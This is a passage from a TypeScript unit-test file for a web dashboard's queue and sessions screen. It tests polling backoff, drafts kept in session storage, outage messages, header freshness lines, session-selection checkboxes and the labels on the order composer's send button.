    { name: "arrivals' rows over the visible part are counted, and Show goes to the nearest", rows: [rowAt(3, -200), rowAt(4, 112)], expected: { count: 2, direction: "above", id: 4 } },
    { name: "arrivals' rows on both sides name the side below, nearest first", rows: [rowAt(3, 40), rowAt(9, 1200), rowAt(8, 900)], expected: { count: 2, direction: "below", id: 8 } },
    { name: "a list put away by an open sheet has no visible part to leave", body: { top: 0, bottom: 0 }, rows: [rowAt(7, 0)], expected: null },
  ];
  for (const row of offViews) test(`off-view note: ${row.name}`, () => assert.deepEqual(call("getOffViewQ", row.body ?? listBody, row.rows), row.expected));

  // spec §4.4: an arrival is tracked until its row has been in the shown list's visible part
  const seen = [
    { name: "a row inside the visible part has been seen", rows: [rowAt(7, 400)], expected: [7] },
    { name: "a row cut by an edge shows, so has been seen", rows: [rowAt(7, 790), rowAt(8, 140)], expected: [7, 8] },
    { name: "a row wholly past an edge has not been seen", rows: [rowAt(7, 820), rowAt(8, 112)], expected: [] },
    { name: "a list put away by an open sheet shows no row", body: { top: 0, bottom: 0 }, rows: [rowAt(7, 0)], expected: [] },
  ];
  for (const row of seen) test(`arrival seen: ${row.name}`, () => assert.deepEqual(call("getInViewIdsQ", row.body ?? listBody, row.rows), row.expected));

  test("the off-view note says how many arrivals sit on which side, and its Show moves to the nearest", () => {
    const shown: number[] = [];
    const queue = { ...withList(buildQueue(), [buildItem()]), status: "New report from yoaida: Nightly sweep done" };
    const tree = render("ListFootQ", { queue, offView: { count: 1, direction: "below", id: 7 }, onShowNew: (id: number) => shown.push(id) });
    assert.match(collectText(tree).replace(/\s+/g, " "), /^New report from yoaida: Nightly sweep done 1 new below Show$/);
    for (const button of buttonLabelled(tree, "Show")) (button.props.onClick as () => void)();
    assert.deepEqual(shown, [7]);
  });

  const footRows = [
    { name: "a line naming an order carries Show, which opens the order view at that order", status: { text: "⚠ yoaida has not received an order", orderId: 7 }, opened: [7] },
    { name: "a plain line carries no Show", status: "Marked as read", opened: [] },
  ];
  for (const row of footRows) {
    test(`list status line: ${row.name}`, () => {
      const opened: number[] = [];
      const queue = { ...withList(buildQueue(), [buildItem()]), status: row.status, openOrderRow: (target: { id: number }) => opened.push(target.id) };
      const tree = render("ListFootQ", { queue });
      const [line] = findNodes(tree, (node) => node.props?.role === "status");
      assert.equal(collectText(line as RenderedNode), typeof row.status === "string" ? row.status : row.status.text);
      for (const button of buttonLabelled(tree, "Show")) (button.props.onClick as () => void)();
      assert.deepEqual(opened, row.opened);
    });
  }

  test("a read asked for while one is in flight joins it; a fresh one runs after it", async () => {
    const flight = { current: null as Promise<unknown> | null };
    const started: string[] = [];
    const start = (label: string) => () => { started.push(label); return Promise.resolve(label); };
    const join = screen.getJoinedReadQ as (flight: unknown, start: () => Promise<unknown>, isFresh?: boolean) => Promise<unknown>;
    const first = join(flight, start("action"), true);
    const joined = join(flight, start("tick"));
    const fresh = join(flight, start("next action"), true);
    assert.deepEqual(await Promise.all([first, joined, fresh]), ["action", "action", "next action"]);
    assert.deepEqual(started, ["action", "next action"]);
    assert.equal(flight.current, null);
  });

  test("each tick schedules the next once it settles: three failures in a row slow the chain, a good read restores the step", async () => {
    const delays: number[] = [];
    let due: (() => Promise<void>) | null = null;
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      setTimeout: (run: () => Promise<void>, ms: number) => { delays.push(ms); due = run; return delays.length; },
      clearTimeout: () => undefined,
    })) as ScreenModule;
    const answers = [false, false, false, true];
    const settled: number[] = [];
    (module.createReadClockQ as (tick: () => Promise<boolean | undefined>, onSettle: (fails: number) => void) => unknown)(async () => answers.shift(), (fails) => settled.push(fails));
    for (let index = 0; index < 4; index += 1) await (due as unknown as () => Promise<void>)();
    assert.deepEqual(delays, [15_000, 15_000, 15_000, 60_000, 15_000]);
    assert.deepEqual(settled, [1, 2, 3, 0], "the failures in a row the header line words its interval from");
  });

  test("a tick that throws counts as a failed read and still schedules the next one, which runs", async () => {
    const delays: number[] = [];
    let due: (() => Promise<void>) | null = null;
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      setTimeout: (run: () => Promise<void>, ms: number) => { delays.push(ms); due = run; return delays.length; },
      clearTimeout: () => undefined,
    })) as ScreenModule;
    const ticks: string[] = [];
    const answers: Array<() => boolean> = [
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("lands"); return true; },
    ];
    (module.createReadClockQ as (tick: () => Promise<boolean | undefined>) => unknown)(async () => (answers.shift() as () => boolean)());
    for (let index = 0; index < 4; index += 1) await (due as unknown as () => Promise<void>)().catch(() => undefined);
    assert.deepEqual(ticks, ["throws", "throws", "throws", "lands"]);
    assert.deepEqual(delays, [15_000, 15_000, 15_000, 60_000, 15_000]);
  });

});

describe("drafts kept in session storage", () => {
  // a Map-backed sessionStorage; `failing` makes every call throw as a full or blocked store does
  const buildStorage = (seed: Record<string, string> = {}, failing = false) => {
    const values = new Map(Object.entries(seed));
    const guard = () => { if (failing) throw new Error("QuotaExceededError"); };
    return {
      values,
      getItem: (key: string) => { guard(); return values.get(key) ?? null; },
      setItem: (key: string, value: string) => { guard(); values.set(key, String(value)); },
    };
  };
  const storedShot = { key: "shot-3", id: "9b2f4c1e-7a10-4d3b-8e5f-2c6a1d0b9e47", name: "Pasted image 1.png", bytes: 482_311, status: "stored", src: "/api/queue/owner/images/9b2f4c1e-7a10-4d3b-8e5f-2c6a1d0b9e47", cause: null };

  test("a kept draft holds the picked option, the text and the images the server stores; nothing a reload cannot resume", () => {
    const draft = {
      code: "B",
      text: "Run the shadow migration first",
      error: "✕ Write an order",
      isWaiting: true,
      images: [
        { ...storedShot, file: { size: 482_311 } },
        { key: "shot-4", id: null, name: "Pasted image 2.png", bytes: 120_004, status: "uploading", src: "blob:http://127.0.0.1:16145/1f0e", cause: null },
        { key: "shot-5", id: null, name: "diagram.webp", bytes: 98_101, status: "failed", src: "blob:http://127.0.0.1:16145/2a7c", cause: "outage" },
      ],
    };
    assert.deepEqual(call("getKeptDraftQ", draft), { code: "B", text: "Run the shadow migration first", images: [storedShot] });
  });

  test("an item whose kept draft is empty leaves the store", () => {
    const drafts = { 41: { text: "", images: [], error: null }, 42: { text: "Ship it" }, 43: undefined };
    assert.deepEqual(call("getKeptDraftsQ", drafts), { 42: { text: "Ship it", images: [] } });
  });

  test("what is set in the store is what a reload gets back", () => {
    const storage = buildStorage();
    const drafts = { 42: { code: "A", text: "Ship it", images: [storedShot] } };
    (screen.setStoredQ as (storage: unknown, key: string, value: unknown) => void)(storage, "queue.drafts", drafts);
    assert.deepEqual(getPlain((screen.getStoredQ as (storage: unknown, key: string, fallback: unknown) => unknown)(storage, "queue.drafts", {})), drafts);
  });

  const unreadable = [
    { name: "nothing stored yet", storage: buildStorage() },
    { name: "a value that is not JSON", storage: buildStorage({ "queue.drafts": "{not json" }) },
    { name: "a store that refuses to be read", storage: buildStorage({ "queue.drafts": "{}" }, true) },
    { name: "no store at all", storage: undefined },
  ];
  for (const row of unreadable) {
    test(`a store that cannot give a draft back gives the empty value: ${row.name}`, () => {
      assert.deepEqual(getPlain((screen.getStoredQ as (storage: unknown, key: string, fallback: unknown) => unknown)(row.storage, "queue.drafts", {})), {});
    });
  }
});

describe("one outage reads one way across the page", () => {
  const outages = [
    { name: "no answer at all", answer: { status: 0, data: null, error: new TypeError("Failed to fetch") } },
    { name: "a database outage", answer: { status: 503, data: { error: "database_unavailable" } } },
    { name: "an unknown server error", answer: { status: 500, data: { error: "queue_environment_failure" } } },
  ];
  const others = [
    { name: "an unknown refusal", answer: { status: 415, data: null } },
    { name: "a 2xx answer without the expected list", answer: { status: 200, data: { rows: [] } } },
  ];
  type Answer = { status: number; data: unknown; error?: Error };
  const fetchFor = (answer: Answer) => async () => {
    if (answer.status === 0) throw answer.error;
    return { status: answer.status, json: async () => answer.data };
  };
  const getCard = (answer: Answer) => {
    const failure = call<{ sentence: string; next: string; detail: string }>("getReadFailureQ", answer);
    const [card] = findNodes(render("QueueFailureQ", { failure, onRetry: () => undefined }), (node) => node.props?.atom === "AlertCard");
    return { failure, card };
  };
  const getRegionText = async (answer: Answer) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: realUi }, fetch: fetchFor(answer) })) as ScreenModule;
    let region = realUi.INITIAL_REGION_STATE as { error: unknown };
    const setResumes = (next: (prev: unknown) => typeof region) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    const element = realUiReact.createElement(realUi.RegionUnavailable, { source: "recent automatic resumes", error: region.error });
    return collectText(renderScreen(element) as RenderedNode);
  };

  for (const row of [...outages, ...others]) {
    test(`the list card gives the resume region's next step, the raw answer behind Details: ${row.name}`, async () => {
      const { failure, card } = getCard(row.answer);
      const regionText = await getRegionText(row.answer);
      assert.ok(regionText.includes(String(card?.props.body)), `card "${card?.props.body}" | region "${regionText}"`);
      assert.doesNotMatch(`${card?.props.title} ${card?.props.body}`, /HTTP|\d{3}|_/);
      assert.equal(card?.props.details, failure.detail);
    });
  }

  for (const row of outages) {
    test(`an owner action on the same outage gives the card's next step: ${row.name}`, () => {
      const { failure } = getCard(row.answer);
      assert.equal(call("getActionErrorQ", row.answer), failure.next);
    });
  }

  // action lines carry no Details → an unanswered request in any browser wording reads as the server not answering
  test("an owner action on an unanswered request in unrecognised browser wording names the server, never Details", () => {
    const answer = { status: 0, data: null, error: new TypeError("The network connection was lost.") };
    const { next } = getCard(outages[0].answer).failure;
    const line = call<string>("getActionErrorQ", answer);
    assert.equal(line, next);
    assert.doesNotMatch(line, /Details/);
  });

  test("a database outage names the database on the card and in the region", async () => {
    const answer = { status: 503, data: { error: "database_unavailable" } };
    assert.match(String(getCard(answer).card?.props.body), /database/);
    assert.match(await getRegionText(answer), /database/);
  });

});

describe("page header freshness", () => {
  const readAt = () => new Date().toISOString();
  const list = (overrides: Record<string, unknown> = {}) => ({ status: "ready", data: { items: [] }, error: null, readAt: readAt(), ...overrides });
  const resumes = (overrides: Record<string, unknown> = {}) => ({ ...READY_RESUMES, ...overrides });
  const getHeader = (queue: Record<string, unknown>) => {
    const [header] = findNodes(render("QueueHeaderQ", { queue: { reload: () => undefined, sessions: buildSessions(), ...queue } }), (node) => node.props?.atom === "PageHeader");
    const freshness = header?.props.freshness as { props: Record<string, unknown> };
    const line = renderScreen(freshness) as RenderedNode;
    const stamp = collectText(line).replace(/\s+/g, " ");
    const regions = findNodes(line, (node) => node.props?.role === "status");
    return { stamp, header, regions: regions.map((node) => [collectText(node).replace(/\s+/g, " "), node.props.title]) };
  };

  // the freshness slot holds the page's own cadence; only a failed list read with rows on screen replaces it
  const rows = [
    { name: "a failed resume re-read leaves the header on the page's cadence", queue: { list: list(), resumes: resumes({ data: [], error: "HTTP 503 database_unavailable" }) }, stamp: /^Checks every 15s$/ },
    { name: "a failed list read with rows loaded says the page is not updated, when it last read and when it tries again", queue: { list: list({ data: { items: [] }, readAt: "2026-11-13T12:29:00.000Z", error: { detail: "HTTP 500" } }), resumes: resumes(), failedChecks: 1 }, stamp: /^⚠ Not updated · last read 21:29 · trying again every 15s$/ },
    { name: "three failed checks in a row say the slower step", queue: { list: list({ data: { items: [] }, readAt: "2026-11-13T12:29:00.000Z", error: { detail: "HTTP 500" } }), resumes: resumes(), failedChecks: 3 }, stamp: /^⚠ Not updated · last read 21:29 · trying again every 60s$/ },
    { name: "both reads landed shows the page's cadence", queue: { list: list(), resumes: resumes() }, stamp: /^Checks every 15s$/ },
  ];
  for (const row of rows) {
    test(row.name, () => {
      assert.match(getHeader(row.queue).stamp.trim(), row.stamp);
    });
  }

  // spec §3.1: the page checks by itself on its own cadence (POLL_Q) and after each owner act → a manual read has nothing to add
  test("the header holds the status line and no Refresh, a read in flight included", () => {
    const { header } = getHeader({ list: list({ status: "loading" }), resumes: resumes({ busy: true }) });
    assert.deepEqual([header?.props.freshness === undefined, header?.props.refresh, header?.props.actions, header?.props.primary], [false, undefined, undefined, undefined]);
  });

  // spec §3.1: one status region in both forms, so a turn to failed and back is said once; its title carries the last read
  const lines = [
    { name: "the cadence line", list: list({ readAt: "2026-11-13T12:30:15.000Z" }) },
    { name: "the failed-check line", list: list({ readAt: "2026-11-13T12:30:15.000Z", error: { detail: "HTTP 500" } }) },
  ];
  for (const row of lines) {
    test(`${row.name} is a status region whose title names the last read`, () => {
      const { stamp, regions } = getHeader({ list: row.list, resumes: resumes(), failedChecks: 1 });
      assert.deepEqual(regions, [[stamp, `Last read ${(realUi.formatKstFull as (iso: string) => string)("2026-11-13T12:30:15.000Z")}`]]);
    });
  }
});

const ENDED_ID = "3d8a5f20-7c41-4b9e-8e2d-5a1c6b0f9e37";
const REPLACED_ID = "c41e9b07-2f6d-4a83-9b15-7e0d3c8a2f64";

function buildSessionRow(overrides: Record<string, unknown> = {}) {
  const id = String(overrides.id ?? SESSION_ID);
  return {
    id,
    sessionIdPrefix: id.slice(0, 8),
    name: "nightly-docs-sweep",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    state: "live",
    exitReason: null,
    isWaiting: false,
    lastActivityAt: "2026-11-12T03:41:09.336Z",
    count: { awaiting: 1, inDelivery: 0 },
    markerSetAt: null,
    isSelectable: true,
    ...overrides,
  };
}

const SESSION_ROWS = [
  buildSessionRow(),
  buildSessionRow({ id: ENDED_ID, name: "atrium-hooks", isNameRegistered: false, state: "exited", exitReason: "ended" }),
  buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false }),
];

function buildSessions(overrides: Record<string, unknown> = {}) {
  return {
    region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false },
    read: () => undefined,
    selectedIds: [],
    toggle: () => undefined,
    clear: () => undefined,
    isEndedShown: false,
    setEndedShown: () => undefined,
    ...overrides,
  };
}

// Orders as useOrdersQ hands it to the desk
function buildOrders(overrides: Record<string, unknown> = {}) {
  return {
    focus: () => undefined, aim: null, aimAt: () => undefined, clearAim: () => undefined, showEarlier: () => undefined, resend: () => undefined,
    thread: { status: "ready", items: [], nextCursor: null, error: null },
    composer: { text: "", isBusy: false, error: null }, setText: () => undefined, setImages: () => undefined, send: () => undefined, read: () => undefined, ...overrides,
  };
}

// the order view with its slots, the rail's ticks beside it
function renderOrders(orders: Record<string, unknown>, sessions: Record<string, unknown> = {}): RenderedNode {
  const { queue } = buildQueue({ sessions: buildSessions(sessions), orders: buildOrders(orders) });
  return renderCard("OrdersViewQ", { queue: withList(queue, []) });
}

// a Card atom's slots ride its props → rendered beside its body, so one tree holds the whole card
function renderCard(name: string, props: unknown): RenderedNode {
  const tree = render(name, props);
  const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
  const slots = ["title", "sub", "right", "bar", "foot"].map((key) => renderScreen(card?.props[key])).filter((node): node is RenderedNode => node !== null && typeof node !== "string");
  return { type: "Fragment", props: {}, children: [tree, ...slots] } as RenderedNode;
}

// the rail as the desk renders it: the page's scope, ticks and list
function renderRail(sessions: Record<string, unknown> = {}) {
  const { queue } = buildQueue({ sessions: buildSessions(sessions) });
  return { tree: renderCard("SessionsRegionQ", { queue: withList(queue, []) }) };
}

const railRowOf = (tree: RenderedNode, id: string) => findNodes(tree, (node) => node.props?.["data-session"] === id)[0] as RenderedNode;

describe("sessions rail rows", () => {
  test("a row shows the registered name, and a nameless row shows its start-directory name marked as such", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const named = collectText(railRowOf(tree, SESSION_ID));
    const nameless = collectText(railRowOf(tree, ENDED_ID));
    assert.ok(named.includes("nightly-docs-sweep") && !named.includes("start directory"), named);
    assert.ok(nameless.includes("atrium-hooks") && nameless.includes("start directory"), nameless);
  });

  test("two shown rows sharing a name show their id prefixes, and a unique name shows none", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, sessionIdPrefix: "4c0e19aa" }), buildSessionRow({ id: REPLACED_ID, name: "gersona" })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const prefixes = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "MachineString").length;
    assert.deepEqual([prefixes(SESSION_ID), prefixes(ENDED_ID), prefixes(REPLACED_ID)], [1, 1, 0]);
  });

  // line 2: the first matching condition (spec §9.1 → Line 2)
  const lines = [
    { name: "something not received leads", row: { state: "live", count: { awaiting: 0, inDelivery: 2 } }, notReceived: 1, first: { text: "1 not received", badge: "warn" } },
    { name: "an unreachable session says so", row: { state: "stale" }, notReceived: 0, first: { text: "Not reachable", badge: "warn" } },
    { name: "a live session with orders on the way counts them", row: { state: "live", count: { awaiting: 0, inDelivery: 1 } }, notReceived: 0, first: { text: "Live" }, second: "1 in delivery" },
    { name: "a live session with nothing on the way gives its last activity", row: { state: "live" }, notReceived: 0, first: { text: "Live" } },
    { name: "an automatic resume not yet registered says so", row: { state: "exited", exitReason: "ended", markerSetAt: "2026-11-12T12:20:11.204Z" }, notReceived: 0, first: { text: "Resume not yet registered" } },
    { name: "an ended session wears its exit word", row: { state: "exited", exitReason: "dead" }, notReceived: 0, first: { text: "Ended · process gone", badge: "tag" } },
  ];
  for (const row of lines) {
    test(`line 2: ${row.name}`, () => {
      const facts = call<Array<{ text: string }>>("getSessionLineQ", buildSessionRow(row.row), row.notReceived);
      assert.deepEqual(facts[0], row.first);
      if (row.second) assert.equal(facts[1]?.text, row.second);
    });
  }

  test("a row that takes no message has no checkbox, and every other row's box is named Select and its session", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const boxOf = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "input" && node.props.type === "checkbox")[0];
    assert.equal(boxOf(SESSION_ID)?.props["aria-label"], "Select nightly-docs-sweep");
    assert.equal(boxOf(REPLACED_ID), undefined);
  });

  // spec §9.1: one control per row — the row is its checkbox's label, so a press anywhere on it ticks; a row that takes no message is no control
  test("a row is its checkbox's label and holds no button, and a row that takes no message is no label", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const controls = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "button" || node.type === "input").map((node) => node.type);
    assert.deepEqual([railRowOf(tree, SESSION_ID).type, controls(SESSION_ID)], ["label", ["input"]]);
    assert.deepEqual([railRowOf(tree, REPLACED_ID).type, controls(REPLACED_ID)], ["div", []]);
  });

  // spec §9.1: checkbox · state mark · name · count from the row's start; a row that takes no message has no box, its mark and name in place
  test("a row reads its box, its state mark, its name and its count from the start, and a row that takes no message starts at its mark", () => {
    const rows = [buildSessionRow({ state: "live", count: { awaiting: 2, inDelivery: 0 } }), buildSessionRow({ id: REPLACED_ID, name: "gersona", isSelectable: false, count: { awaiting: 3, inDelivery: 0 } })];
    const { tree } = renderRail({ isEndedShown: true, region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const slots = (id: string) => findNodes(railRowOf(tree, id), (node) => /^queue-rail-(box|mark|name|count)(\s|$)/.test(String(node.props?.className ?? "")))
      .map((node) => String(node.props.className).split(" ")[0]);
    assert.deepEqual([slots(SESSION_ID), slots(REPLACED_ID)], [["queue-rail-box", "queue-rail-mark", "queue-rail-name", "queue-rail-count"], ["queue-rail-mark", "queue-rail-name", "queue-rail-count"]]);
  });

  // spec §9.1: live → the filled mark; not live (not reachable, ended, a resume not yet registered) → the hollow ring
  const marks = [
    { name: "a live session wears the filled mark", row: { state: "live" }, isLive: true },
    { name: "a session not reachable wears the ring", row: { state: "stale" }, isLive: false },
    { name: "an ended session wears the ring", row: { state: "exited", exitReason: "dead" }, isLive: false },
    { name: "a resume not yet registered wears the ring", row: { state: "exited", exitReason: "ended", markerSetAt: "2026-11-12T12:20:11.204Z" }, isLive: false },
  ];
  for (const row of marks) {
    test(`state mark: ${row.name}`, () => {
      const { tree } = renderRail({ isEndedShown: true, region: { status: "ready", data: { sessions: [buildSessionRow(row.row)], hasMore: false }, error: null, busy: false } });
      const [mark] = findNodes(railRowOf(tree, SESSION_ID), (node) => String(node.props?.className ?? "").startsWith("queue-rail-mark"));
      assert.deepEqual([String(mark?.props.className).split(" ").includes("is-live"), mark?.props["aria-hidden"]], [row.isLive, "true"]);
    });
  }

  test("every box of the rail shares one description of what a tick does", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const described = findNodes(tree, (node) => node.type === "input" && node.props.type === "checkbox").map((node) => node.props["aria-describedby"]);
    const [hint] = findNodes(tree, (node) => node.props?.id === described[0]);
    assert.ok(described.length === 3 && described.every((id) => id === described[0]), String(described));
    assert.equal(collectText(hint as RenderedNode), "Ticked sessions set whose reports and orders are shown and who receives the next order. With none ticked, every session is shown and no order can be sent.");
  });

  test("ticking a row calls the toggle with that row's id", () => {
    const toggled: unknown[] = [];
    const { tree } = renderRail({ isEndedShown: true, toggle: (id: string) => toggled.push(id) });
    const [box] = findNodes(railRowOf(tree, ENDED_ID), (node) => node.type === "input" && node.props.type === "checkbox");
    (box?.props.onChange as () => void)();
    assert.deepEqual(toggled, [ENDED_ID]);
  });

  test("ticking adds a row and ticking it again removes it, keeping the other ticks", () => {
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID], ENDED_ID), [SESSION_ID, ENDED_ID]);
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID, ENDED_ID], SESSION_ID), [ENDED_ID]);
  });

  test("ended rows stay folded until the Ended band is open", () => {
    const ids = (isEndedShown: boolean) => call<Array<{ id: string }>>("getShownSessionsQ", SESSION_ROWS, isEndedShown).map((row) => row.id);
    assert.deepEqual(ids(false), [SESSION_ID]);
    assert.deepEqual(ids(true), [SESSION_ID, ENDED_ID, REPLACED_ID]);
  });

  test("the waiting count is the row's one solid badge, and a session with nothing waiting shows none", () => {
    const rows = [buildSessionRow({ count: { awaiting: 5, inDelivery: 0 } }), buildSessionRow({ id: ENDED_ID, name: "gersona", count: { awaiting: 0, inDelivery: 0 } })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const solid = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "Badge" && node.props.fill === "solid").map((node) => collectText(node));
    assert.deepEqual([solid(SESSION_ID), solid(ENDED_ID)], [["5"], []]);
  });
});

describe("the ticks as the one selection", () => {
  const gersona = buildSession({ id: "a1", name: "gersona" });
  const yoaida = buildSession({ id: "b2", name: "yoaida" });
  const atrium = buildSession({ id: "c3", name: "atrium" });
  const items = [buildItem({ id: 1, session: gersona }), buildItem({ id: 2, session: yoaida }), buildItem({ id: 3, session: atrium })];
  // spec §9.1: the ticked sessions are the list's scope; nothing ticked → every session's items
  const scopes = [
    { name: "nothing ticked shows every session's items", ids: [], expected: [1, 2, 3] },
    { name: "two ticked show theirs and leave a third session's out", ids: ["a1", "b2"], expected: [1, 2] },
  ];
  for (const row of scopes) {
    test(`the list's scope: ${row.name}`, () => {
      assert.deepEqual(call<Array<{ id: number }>>("getVisibleItemsQ", items, { profile: "" }, row.ids).map((item) => item.id), row.expected);
    });
  }

  const rails = [buildSessionRow({ id: "a1", name: "gersona" }), buildSessionRow({ id: "b2", name: "yoaida" })];
  const titles = [
    { name: "nothing ticked reads All sessions", ids: [], title: "All sessions" },
    { name: "one tick names its session", ids: ["b2"], title: "yoaida" },
    { name: "several ticks name them all in tick order", ids: ["b2", "a1"], title: "yoaida, gersona" },
  ];
  for (const row of titles) test(`the list's head: ${row.name}`, () => assert.equal(call("getScopeTitleQ", rails, row.ids), row.title));

  test("no rail row and no band is aria-current, whatever is ticked", () => {
    const { tree } = renderRail({ selectedIds: [SESSION_ID] });
    assert.equal(findNodes(tree, (node) => node.props?.["aria-current"] !== undefined).length, 0);
  });

  // master box (spec §9.1): nothing ticked → every live session that takes a message; anything ticked → every tick cleared, an ended one's too
  const live = buildSessionRow({ id: "d4", name: "aidl" });
  const masterRows = [...SESSION_ROWS, live];
  const masters = [
    { name: "none ticked ticks every live session", ids: [], next: [SESSION_ID, "d4"], state: "none" },
    { name: "an ended tick alone clears", ids: [ENDED_ID], next: [], state: "some" },
    { name: "some live ticked clears every tick", ids: [SESSION_ID, ENDED_ID], next: [], state: "some" },
    { name: "every live session ticked clears them all", ids: [SESSION_ID, "d4"], next: [], state: "all" },
  ];
  for (const row of masters) {
    test(`the master box: ${row.name}`, () => {
      assert.equal(call("getMasterTickQ", row.ids, masterRows), row.state);
      assert.deepEqual(call("putMasterTickQ", row.ids, masterRows), row.next);
    });
  }

  test("the master box is named for every live session, and absent while no session takes a message", () => {
    const masterOf = (rows: unknown[]) => findNodes(renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } }).tree, (node) => node.props?.["aria-label"] === "Select all live sessions").length;
    assert.deepEqual([masterOf(SESSION_ROWS), masterOf([SESSION_ROWS[2]])], [1, 0]);
  });

  // spec §9.1 → In the address: a tick on a session that no longer takes a message is dropped and said in the status line
  const dropped = [
    { name: "one", ids: [SESSION_ID, REPLACED_ID], line: "⚠ nightly-docs-sweep no longer takes orders and was unticked." },
    { name: "none", ids: [SESSION_ID], line: null },
  ];
  for (const row of dropped) test(`a dropped tick's status line: ${row.name}`, () => assert.equal(call("getDroppedNoteQ", row.ids, SESSION_ROWS), row.line));

  // spec §9.2: the recipients changed under a draft → the note says so once
  const changes = [
    { name: "to two sessions", names: ["gersona", "yoaida"], note: "Recipients changed: now gersona and yoaida." },
    { name: "to none", names: [], note: "No session ticked now: this order has no recipient." },
  ];
  for (const row of changes) test(`the recipients-changed note: ${row.name}`, () => assert.equal(call("getRecipientsNoteQ", row.names), row.note));

  test("the master box shows the mixed state while only some live sessions are ticked", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, state: "live" })];
    assert.equal(call("getMasterTickQ", [SESSION_ID], rows), "some");
  });

  test("the session ticks round-trip through the hash", async () => {
    const location = { hash: "#queue?to=a1,b2&item=7" };
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub(), location, history: { replaceState: (_s: unknown, _t: string, url: string) => { location.hash = url; } } } })) as ScreenModule;
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), ["a1", "b2"]);
    (module.setHashStateQ as (patch: unknown) => void)({ to: "" });
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), []);
  });
});

// a count the rail has not read is no claim → no `0 live · 0 ended` over its placeholder or its outage
describe("the rail head", () => {
  const headSub = (region: unknown) => {
    const { queue } = buildQueue({ sessions: buildSessions({ region }) });
    const tree = render("SessionsRegionQ", { queue: withList(queue, []) });
    return findNodes(tree, (node) => node.props?.atom === "Card")[0]?.props.sub;
  };
  const live = SESSION_ROWS.filter((row) => row.state !== "exited").length;
  const rows = [
    { name: "a first read in flight states no count", region: { status: "loading", data: null, error: null, busy: true }, expected: undefined },
    { name: "a failed first read states no count", region: { status: "error", data: null, error: { message: "down" }, busy: false }, expected: undefined },
    { name: "a read rail states its live and ended counts", region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false }, expected: `${live} live · ${SESSION_ROWS.length - live} ended` },
  ];
  for (const row of rows) test(row.name, () => assert.equal(headSub(row.region), row.expected));
});

describe("the rail foot", () => {
  const resumes = (results: string[]) => ({ status: "ready", busy: false, error: null, data: results.map((result, index) => ({ item: { id: index + 1, title: "Rebase" }, session: { profileLabel: "work-dev", cwdTail: "wt/a" }, attempt: 1, sentAt: "2026-11-12T12:20:11.204Z", result, abortReason: null, bgId: null })) });
  const footButton = (region: unknown) => {
    const { queue } = buildQueue({ resumes: region });
    const tree = renderCard("SessionsRegionQ", { queue: withList(queue, []) });
    return findNodes(tree, (node) => node.type === "button" && collectText(node).includes("Automatic resumes")).map((node) => collectText(node));
  };
  const rows = [
    { name: "two resumes open from one quiet button with their count", region: resumes(["sent", "acked"]), expected: ["Automatic resumes 2"] },
    { name: "a failed resume puts the warning glyph before the label", region: resumes(["failed"]), expected: ["⚠ Automatic resumes 1"] },
    { name: "no resume renders no button", region: resumes([]), expected: [] },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(footButton(row.region), row.expected));
});

describe("order composer", () => {
  const shown = SESSION_ROWS;
  // one tick set → list scope, thread and recipients agree: a ticked ended row stays a recipient while its band is folded
  test("the targets are every ticked row that takes a message, an ended one included, never a replaced row", () => {
    const ticked = [SESSION_ID, ENDED_ID, REPLACED_ID];
    assert.deepEqual(call("getSendTargetsQ", shown, ticked), { ids: [SESSION_ID, ENDED_ID], names: ["nightly-docs-sweep", "atrium-hooks"], endedCount: 1 });
  });

  // spec §9.2 → Foot: the send button names who the order goes to
  const labels = [
    { name: "no tick", targets: { ids: [], names: [], endedCount: 0 }, label: "Send order" },
    { name: "one target names it", targets: { ids: [SESSION_ID], names: ["gersona"], endedCount: 0 }, label: "Send to gersona" },
    { name: "several targets count them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 0 }, label: "Send to 2 sessions" },
    { name: "an ended target among them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 1 }, label: "Send to 2 sessions · resumes 1 ended" },
  ];
  for (const row of labels) test(`the send label: ${row.name}`, () => assert.equal(call("getSendLabelQ", call("getSendPartsQ", row.targets)), row.label));

  const MAX_TARGETS = vm.runInContext("MESSAGE_Q.MAX_TARGETS", screen) as number;
  const targetsOf = (count: number) => ({ ids: Array.from({ length: count }, () => randomUUID()), names: Array.from({ length: count }, (_v, index) => `s${index}`), endedCount: 0 });
